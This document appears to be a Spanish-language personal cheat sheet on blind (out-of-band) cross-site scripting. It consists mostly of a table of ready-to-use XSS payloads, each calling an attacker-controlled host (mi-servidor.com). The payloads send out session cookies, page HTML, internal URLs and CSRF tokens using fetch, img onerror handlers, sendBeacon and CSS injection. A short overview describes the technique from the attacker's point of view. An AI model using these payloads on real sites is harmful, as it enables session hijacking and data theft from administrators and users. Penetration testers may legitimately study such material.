---
aliases:
tags:
  - type/cheatsheet
primary categories:
secondary categories:
tertiary categories:
type: CheatSheet
linked:
  - "[[Cross-Site Scripting (XSS)]]"
---
# XSS - Explotación Out-of-Band (Blind XSS)

___

## Cheatsheet

|**Payload / Mecanismo OOB**|**Contexto de Inyección**|**Descripción de Explotación y Exfiltración**|
|---|---|---|
|`<script src="https://mi-servidor.com/hook.js"></script>`|Inyección directa de script remoto.|El vector más versátil. Si la aplicación no cuenta con un [[Content Security Policy]] (CSP) estricto, permite cargar infraestructuras completas de post-explotación (como XSS Hunter o BeEF) en el panel administrativo.|
|`<script>fetch('https://mi-servidor.com/log?c=' + btoa(document.cookie))</script>`|Bloques de script preexistentes o inyecciones permitidas.|Utiliza la API Fetch para enviar datos de forma asíncrona. En este caso, codifica en Base64 las cookies de sesión del administrador y las exfiltra a través de un parámetro GET.|
|`<img src="x" onerror="this.src='https://mi-servidor.com/?dom='+btoa(document.body.innerHTML)">`|Filtrado de etiquetas `<script>` (Evasión vía eventos).|Útil si el panel de administración filtra scripts directos pero permite HTML básico. Fuerza un error de carga de imagen para disparar el manejador de eventos y exfiltrar, por ejemplo, el código fuente de la página interna.|
|`<script>new Image().src="https://mi-servidor.com/?url="+location.href;</script>`|Inyección silenciosa.|Crea un objeto de imagen en memoria sin insertarlo en el [[DOM]]. Genera una petición HTTP GET instantánea y completamente invisible para la víctima, ideal para robar URLs internas ocultas.|
|`"><link rel="stylesheet" href="https://mi-servidor.com/log.css">`|Exfiltración sin JavaScript (CSS Injection).|Vector alternativo cuando la ejecución de JavaScript está completamente deshabilitada o fuertemente bloqueada. Permite cargar un CSS malicioso externo que utilice selectores de atributos para robar tokens CSRF o datos del DOM carácter por carácter.|
|`<script>navigator.sendBeacon('https://mi-servidor.com/recv', document.cookie);</script>`|Evasión de cierres de página.|La API `sendBeacon` garantiza que la petición HTTP POST se envíe en segundo plano incluso si el administrador cierra la pestaña del navegador inmediatamente después de abrir la página infectada.|


___

## Overview

El [[Blind XSS]] es una variante donde el punto de inyección y el punto de ejecución están completamente separados, ocurriendo la ejecución generalmente en el backend o en paneles administrativos a los que no tengo acceso. Como no puedo observar el reflejo del payload en mi propia sesión, recurro a la explotación Out-of-Band (OOB). Esta técnica consiste en inyectar un payload ciego diseñado para forzar al navegador de la víctima (ej. un administrador revisando logs) a realizar una petición de red hacia un servidor externo bajo mi control, confirmando la vulnerabilidad y exfiltrando datos sensibles en el proceso.